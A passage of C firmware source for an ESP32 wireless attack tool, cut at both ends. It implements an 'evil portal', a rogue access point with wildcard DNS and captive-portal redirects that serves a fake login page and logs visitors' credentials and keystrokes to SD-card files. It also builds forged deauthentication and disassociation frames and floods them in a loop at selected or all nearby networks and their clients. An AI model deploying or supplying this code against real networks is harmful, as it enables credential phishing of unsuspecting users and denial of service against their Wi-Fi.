                printf("Failed to open %s for appending\n", current_creds_filename);
            }
        }
    }
    if (login_done) {
        httpd_resp_set_status(req, "204 No Content");
        httpd_resp_send(req, NULL, 0);
    } else {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/login");
        httpd_resp_send(req, NULL, 0);
    }
    return ESP_OK;
}

esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
    ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    if (login_done) {
        httpd_resp_set_status(req, "204 No Content");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }
    const char *uri = req->uri;
    if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
        httpd_resp_set_status(req, "301 Moved Permanently");
        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
        httpd_resp_send(req, NULL, 0);
        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
        return ESP_OK;
    }
    // minimal logging for captive probe

    if (strstr(req->uri, "/get") != NULL) {
        get_info_handler(req);
        return ESP_OK;
    }

    if (strstr(get_content_type(req->uri), "application/octet-stream") == NULL) {
        file_handler(req);
        return ESP_OK;
    }

    httpd_resp_set_status(req, "301 Moved Permanently");
    char LocationRedir[512];
    snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
    httpd_resp_set_hdr(req, "Location", LocationRedir);
    httpd_resp_send(req, NULL, 0);
    ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    return ESP_OK;
}

httpd_handle_t start_portal_webserver(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 15;
    config.max_open_sockets = 13; // Increased from 7
    config.backlog_conn = 10;     // Increased from 7
    config.stack_size = 8192;
    if (httpd_start(&evilportal_server, &config) == ESP_OK) {
        httpd_uri_t portal_uri = {
            .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t log_handler_uri = {
            .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
        httpd_uri_t portal_png = {
            .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_jpg = {
            .uri = ".jpg", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_css = {
            .uri = ".css", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_js = {
            .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_html = {
            .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_register_uri_handler(evilportal_server, &portal_android_get);
        httpd_register_uri_handler(evilportal_server, &portal_android_head);
        httpd_register_uri_handler(evilportal_server, &portal_apple_get);
        httpd_register_uri_handler(evilportal_server, &portal_apple_head);
        httpd_register_uri_handler(evilportal_server, &microsoft_get);
        httpd_register_uri_handler(evilportal_server, &microsoft_head);
        httpd_register_uri_handler(evilportal_server, &portal_uri);
        httpd_register_uri_handler(evilportal_server, &log_handler_uri);

        httpd_register_uri_handler(evilportal_server, &portal_png);
        httpd_register_uri_handler(evilportal_server, &portal_jpg);
        httpd_register_uri_handler(evilportal_server, &portal_css);
        httpd_register_uri_handler(evilportal_server, &portal_js);
        httpd_register_uri_handler(evilportal_server, &portal_html);
        httpd_uri_t done_uri = { .uri = "/done", .method = HTTP_GET, .handler = done_handler, .user_ctx = NULL };
        httpd_register_uri_handler(evilportal_server, &done_uri);
        httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND,
                                   captive_portal_redirect_handler);
    }
    return evilportal_server;
}

esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *SSID, const char *Password,
                                          const char *ap_ssid, const char *domain) {
    login_done = false; // Reset login state on start
    current_creds_filename[0] = '\0'; // Reset filenames at the start
    current_keystrokes_filename[0] = '\0';

    // Generate indexed filenames if SD card is available
    if (sd_card_manager.is_initialized) {
        const char* dir_path = "/mnt/ghostesp/evil_portal";
        int creds_index = get_next_file_index(dir_path, "portal_creds", "txt");
        int keys_index = get_next_file_index(dir_path, "portal_keystrokes", "txt");

        if (creds_index >= 0) {
            snprintf(current_creds_filename, sizeof(current_creds_filename),
                     "%s/portal_creds_%d.txt", dir_path, creds_index);
            printf("Logging credentials to: %s\n", current_creds_filename);
        } else {
            printf("Failed to get next index for credentials file.\n");
        }

        if (keys_index >= 0) {
            snprintf(current_keystrokes_filename, sizeof(current_keystrokes_filename),
                     "%s/portal_keystrokes_%d.txt", dir_path, keys_index);
            printf("Logging keystrokes to: %s\n", current_keystrokes_filename);
        } else {
             printf("Failed to get next index for keystrokes file.\n");
        }
    }

    // Check if we need to use the internal default portal
    if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
    } else if (URLorFilePath != NULL && strlen(URLorFilePath) < sizeof(PORTALURL)) {
        // If not default, copy the provided path
        strlcpy(PORTALURL, URLorFilePath, sizeof(PORTALURL));
    } else {
        // Handle invalid or too long paths by defaulting to internal portal as a fallback
        ESP_LOGW(TAG, "Invalid or too long URL/FilePath provided, defaulting to internal portal.");
        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
    }

    // Domain is fetched from settings in commandline.c, just copy it if provided
    if (domain != NULL && strlen(domain) < sizeof(domain_str)) {
         strlcpy(domain_str, domain, sizeof(domain_str));
    } else {
         domain_str[0] = '\0'; // Ensure empty if invalid
    }

    ap_manager_stop_services();

    esp_netif_dns_info_t dnsserver;

    uint32_t my_ap_ip = esp_ip4addr_aton("192.168.4.1");

    esp_netif_ip_info_t ipInfo_ap;
    ipInfo_ap.ip.addr = my_ap_ip;
    ipInfo_ap.gw.addr = my_ap_ip;
    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255, 255, 255, 0);
    esp_netif_dhcps_stop(wifiAP); // stop before setting ip WifiAP
    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
    esp_netif_dhcps_start(wifiAP);

    wifi_config_t ap_config = {.ap = {
                                   .channel = 0,
                                   .ssid_hidden = 0,
                                   .max_connection = 8,
                                   .beacon_interval = 100,
                               }};

    // Configure AP SSID and optional PSK
    if (SSID != NULL && SSID[0] != '\0') {
        strlcpy((char *)ap_config.ap.ssid, SSID, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen(SSID);
    } else {
        strlcpy((char *)ap_config.ap.ssid, ap_ssid, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen(ap_ssid);
    }
    if (Password != NULL && Password[0] != '\0') {
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        strlcpy((char *)ap_config.ap.password, Password, sizeof(ap_config.ap.password));
    } else {
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
    }
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    dhcps_offer_t dhcps_dns_value = OFFER_DNS;
    esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                           &dhcps_dns_value, sizeof(dhcps_dns_value));
    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
    esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));

    start_portal_webserver();

    dns_server_config_t dns_config = {
        .num_of_entries = 1,
        .item = {{.name = "*", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}}}};

    dns_handle = start_dns_server(&dns_config);
    if (dns_handle) {
        printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
    } else {
        printf("Failed to start DNS server\n");
    }
    
    return ESP_OK; // Add return value at the end
}

void wifi_manager_stop_evil_portal() {
    login_done = false; // Reset login state on stop
    current_creds_filename[0] = '\0'; // Clear saved filenames
    current_keystrokes_filename[0] = '\0';

    if (dns_handle != NULL) {
        stop_dns_server(dns_handle);
        dns_handle = NULL;
    }

    if (evilportal_server != NULL) {
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
    }

    ESP_ERROR_CHECK(esp_wifi_stop());

    ap_manager_init();
}

void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));

    printf("WiFi monitor started.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi monitor started.\n");
}

void wifi_manager_stop_monitor_mode() {
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    printf("WiFi monitor stopped.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi monitor stopped.\n");

    // Stop the station scan channel hopping timer if it's active
    if (scansta_hopping_active) {
        stop_scansta_channel_hopping();
    }

    // NOTE: Stopping the PineAP timer (channel_hop_timer) is handled by stop_pineap_detection() in callbacks.c
}

void wifi_manager_init(void) {

    esp_log_level_set("wifi", ESP_LOG_ERROR); // Only show errors, not warnings

    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    // Initialize the TCP/IP stack and WiFi driver
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifiAP = esp_netif_create_default_wifi_ap();
    wifiSTA = esp_netif_create_default_wifi_sta();

    // Initialize WiFi with default settings
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // configure country based on chip: full dual-band on C5, 2.4GHz only on others
#if CONFIG_IDF_TARGET_ESP32C5
    wifi_country_t current_country;
    esp_err_t get_country_err = esp_wifi_get_country(&current_country);
    if (get_country_err == ESP_OK) {
        ESP_LOGI(TAG, "ESP32-C5 Current Country: CC='%s', schan=%d, nchan=%d, policy=%s",
                 current_country.cc, current_country.schan, current_country.nchan,
                 current_country.policy == WIFI_COUNTRY_POLICY_AUTO ? "AUTO" : "MANUAL");
    } else {
        ESP_LOGW(TAG, "ESP32-C5: Failed to get current country config: %s", esp_err_to_name(get_country_err));
    }
#else
    // enable all 2.4 GHz channels (1-14) manually for other targets
    wifi_country_t country_to_set = {
        .cc     = "JP",
        .schan  = 1,
        .nchan  = 14,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    ESP_LOGI(TAG, "Setting country for non-C5 target: CC='%s', schan=%d, nchan=%d, policy=MANUAL",
             country_to_set.cc, country_to_set.schan, country_to_set.nchan);
    ESP_ERROR_CHECK(esp_wifi_set_country(&country_to_set));
#endif

    // Create the WiFi event group
    wifi_event_group = xEventGroupCreate();

    // Register the event handler for WiFi events
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                                        &wifi_event_handler, NULL, NULL));

    // Set WiFi mode to STA (station)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    // Configure the SoftAP settings
    wifi_config_t ap_config = {
        .ap = {.ssid = "",
               .ssid_len = strlen(""),
               .password = "",
               .channel = 1,
               .authmode = WIFI_AUTH_OPEN,
               .max_connection = 4,
               .ssid_hidden = 1},
    };

    // Apply the AP configuration
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    // Start the Wi-Fi AP
    ESP_ERROR_CHECK(esp_wifi_start());

    // Initialize global CA certificate store
    ret = esp_crt_bundle_attach(NULL);
    if (ret == ESP_OK) {
        printf("Global CA certificate store initialized successfully.\n");
    } else {
        printf("Failed to initialize global CA certificate store: %s\n", esp_err_to_name(ret));
    }
}

void wifi_manager_start_scan() {
    ap_manager_stop_services();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}};

    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);

    printf("WiFi Scan started\n");
    #ifdef CONFIG_IDF_TARGET_ESP32C5
        printf("Please wait 10 Seconds...\n");
        TERMINAL_VIEW_ADD_TEXT("Please wait 10 Seconds...\n");
    #else
        printf("Please wait 5 Seconds...\n");
        TERMINAL_VIEW_ADD_TEXT("Please wait 5 Seconds...\n");
    #endif
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);

    if (err != ESP_OK) {
        printf("WiFi scan failed to start: %s", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        return;
    }

    wifi_manager_stop_scan();
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(ap_manager_start_services());
}

// Stop scanning for networks
void wifi_manager_stop_scan() {
    esp_err_t err;

    err = esp_wifi_scan_stop();
    if (err == ESP_ERR_WIFI_NOT_STARTED) {

        // commented out for now because it's cleaner without and stop commands send this when not
        // really needed

        /*printf("WiFi scan was not active.\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi scan was not active.\n"); */

        return;
    } else if (err != ESP_OK) {
        printf("Failed to stop WiFi scan: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to stop WiFi scan\n");
        return;
    }

    wifi_manager_stop_monitor_mode();
    rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);

    uint16_t initial_ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&initial_ap_count);
    if (err != ESP_OK) {
        printf("Failed to get AP count: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to get AP count: %s\n", esp_err_to_name(err));
        return;
    }

    // only print AP count once, no need for both "Initial" and "Actual"
    printf("Found %u access points\n", initial_ap_count);
    TERMINAL_VIEW_ADD_TEXT("Found %u access points\n", initial_ap_count);

    if (initial_ap_count > 0) {
        if (scanned_aps != NULL) {
            free(scanned_aps);
            scanned_aps = NULL;
        }

        scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
        if (scanned_aps == NULL) {
            printf("Failed to allocate memory for AP info\n");
            ap_count = 0;
            return;
        }

        uint16_t actual_ap_count = initial_ap_count;
        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
        if (err != ESP_OK) {
            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
            free(scanned_aps);
            scanned_aps = NULL;
            ap_count = 0;
            return;
        }

        ap_count = actual_ap_count;
    } else {
        printf("No access points found\n");
        ap_count = 0;
    }
}

void wifi_manager_list_stations() {
    if (station_count == 0) {
        printf("No stations found.\n");
        return;
    }
    printf("Listing all stations and their associated APs:\n");
    for (int i = 0; i < station_count; i++) {
        char sanitized_ssid[33]; // Buffer for sanitized SSID
        bool found = false;
        for (int j = 0; j < ap_count; j++) {
            if (memcmp(scanned_aps[j].bssid, station_ap_list[i].ap_bssid, 6) == 0) {
                sanitize_ssid_and_check_hidden(scanned_aps[j].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                found = true;
                break;
            }
        }
        if (!found) {
            strcpy(sanitized_ssid, "(Unknown AP)");
         }
        printf("[%d] Station MAC: %02X:%02X:%02X:%02X:%02X:%02X, AP SSID: %s, AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
               i,
               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
               sanitized_ssid,
               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
        TERMINAL_VIEW_ADD_TEXT("[%d] Station MAC: %02X:%02X:%02X:%02X:%02X:%02X, AP SSID: %s, AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                               i,
                               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
                               sanitized_ssid,
                               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
    }
}

static bool check_packet_rate(void) {
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds

    // Reset counter every second
    if (current_time - last_packet_time >= 1000) {
        packet_counter = 0;
        last_packet_time = current_time;
        return true;
    }

    // Check if we've exceeded our rate limit
    if (packet_counter >= MAX_PACKETS_PER_SECOND) {
        return false;
    }

    packet_counter++;
    return true;
}

static const uint8_t deauth_packet_template[26] = {
    0xc0, 0x00,                         // Frame Control
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00 // Reason code: Class 3 frame received from nonassociated STA
};

static const uint8_t disassoc_packet_template[26] = {
    0xa0, 0x00,                         // Frame Control (only first byte different)
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code
};

esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        printf("Failed to set channel: %s\n", esp_err_to_name(err));
    }

    // Create packets from templates
    uint8_t deauth_frame[sizeof(deauth_packet_template)];
    uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
    memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
    memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));

    // Check if broadcast MAC
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) {
            is_broadcast = false;
            break;
        }
    }

    // Direction 1: AP -> Station
    // Set destination (target)
    memcpy(&deauth_frame[4], mac, 6);
    memcpy(&disassoc_frame[4], mac, 6);

    // Set source and BSSID (AP)
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    memcpy(&disassoc_frame[10], bssid, 6);
    memcpy(&disassoc_frame[16], bssid, 6);

    // Add sequence number (random)
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth_frame[22] = seq & 0xFF;
    deauth_frame[23] = (seq >> 8) & 0xFF;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = (seq >> 8) & 0xFF;

    // Send frames with rate limiting
    if (check_packet_rate()) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if(err == ESP_OK) deauth_packets_sent++;
        if (check_packet_rate()) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
    }

    // If not broadcast, send reverse direction
    if (!is_broadcast) {
        // Swap addresses for Station -> AP direction
        memcpy(&deauth_frame[4], bssid, 6); // Set destination as AP
        memcpy(&deauth_frame[10], mac, 6);  // Set source as station
        memcpy(&deauth_frame[16], mac, 6);  // Set BSSID as station

        memcpy(&disassoc_frame[4], bssid, 6);
        memcpy(&disassoc_frame[10], mac, 6);
        memcpy(&disassoc_frame[16], mac, 6);

        // New sequence number for reverse direction
        seq = (esp_random() & 0xFFF) << 4;
        deauth_frame[22] = seq & 0xFF;
        deauth_frame[23] = (seq >> 8) & 0xFF;
        disassoc_frame[22] = seq & 0xFF;
        disassoc_frame[23] = (seq >> 8) & 0xFF;

        // Send reverse frames with rate limiting
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
    }

    return ESP_OK;
}

void wifi_deauth_task(void *param) {
    if (ap_count == 0) {
        printf("No access points found\n");
        printf("Please run 'scan -w' first to find targets\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("Please run 'scan -w' first to find targets\n");
        vTaskDelete(NULL);
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        printf("Failed to allocate memory for AP info\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for AP info\n");
        vTaskDelete(NULL);
        return;
    }

    uint32_t last_log = 0;
    
    while (1) {
        if (strlen((const char *)selected_ap.ssid) > 0) {
            for (int i = 0; i < ap_count; i++) {
                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
                    // Deauth on the AP's channel
                    {
                        int ch = ap_info[i].primary;
                        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                        for (int j = 0; j < station_count; j++) {
                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                            }
                        }
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }
                }
            }
        } else {
            // Global deauth on each AP's channel
            for (int i = 0; i < ap_count; i++) {
                int ch = ap_info[i].primary;
                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(50));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent/5);
            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent/5); 
            deauth_packets_sent = 0;
            last_log = now;
        }

    }
}

void wifi_manager_start_deauth() {
    if (!beacon_task_running) {
        ap_manager_stop_services();
        esp_wifi_start();
        printf("Restarting Wi-Fi\n");
        xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
    } else {
        printf("Deauth already running.\n");
        TERMINAL_VIEW_ADD_TEXT("Deauth already running.\n");
    }
}

void wifi_manager_select_ap(int index) {

    if (ap_count == 0) {
        printf("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        return;
    }

    if (scanned_aps == NULL) {
        printf("No AP info available (scanned_aps is NULL)\n");
        TERMINAL_VIEW_ADD_TEXT("No AP info available (scanned_aps is NULL)\n");
        return;
    }

    if (index < 0 || index >= ap_count) {
        printf("Invalid index: %d. Index should be between 0 and %d\n", index, ap_count - 1);
        TERMINAL_VIEW_ADD_TEXT("Invalid index: %d. Index should be between 0 and %d\n", index,
                               ap_count - 1);
        return;
    }

    selected_ap = scanned_aps[index];

    char sanitized_ssid[33];
    sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));

    printf("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           sanitized_ssid, selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
           selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);

    TERMINAL_VIEW_ADD_TEXT(
        "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", sanitized_ssid,
        selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2], selected_ap.bssid[3],
        selected_ap.bssid[4], selected_ap.bssid[5]);

    printf("Selected Access Point Successfully\n");
    TERMINAL_VIEW_ADD_TEXT("Selected Access Point Successfully\n");
}

void wifi_manager_select_station(int index) {
    if (station_count == 0) {
        printf("No stations found.\n");
        TERMINAL_VIEW_ADD_TEXT("No stations found.\n");
        return;
    }
    if (index < 0 || index >= station_count) {
        printf("Invalid station index: %d. Index should be between 0 and %d\n", index, station_count - 1);
        TERMINAL_VIEW_ADD_TEXT("Invalid station index: %d. Index should be between 0 and %d\n", index, station_count - 1);
        return;
    }
    selected_station = station_ap_list[index];
    char ssid_str[33];
    char sanitized_ssid[33];
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, selected_station.ap_bssid, 6) == 0) {
            memcpy(ssid_str, scanned_aps[i].ssid, 32);
            ssid_str[32] = '\0';
            int len = strlen(ssid_str);
            for (int j = 0; j < len; j++) {
                char c = ssid_str[j];
                sanitized_ssid[j] = (c >= 32 && c <= 126) ? c : '.';
            }
            sanitized_ssid[len] = '\0';
            break;
        }
    }
    printf("Selected Station %d: Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n    -> AP SSID: %s\n    -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           index,
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
           selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           sanitized_ssid,
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
           selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    TERMINAL_VIEW_ADD_TEXT("Selected Station %d: Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n    -> AP SSID: %s\n    -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           index,
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
           selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           sanitized_ssid,
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
           selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    station_selected = true;
}

void wifi_manager_deauth_station(void) {
    if (!station_selected) {
        wifi_manager_start_deauth();
        return;
    }
    if (deauth_station_task_handle) {
        printf("Station deauth already running.\n");
        return;
    }
    ap_manager_stop_services(); // stop AP and HTTP server
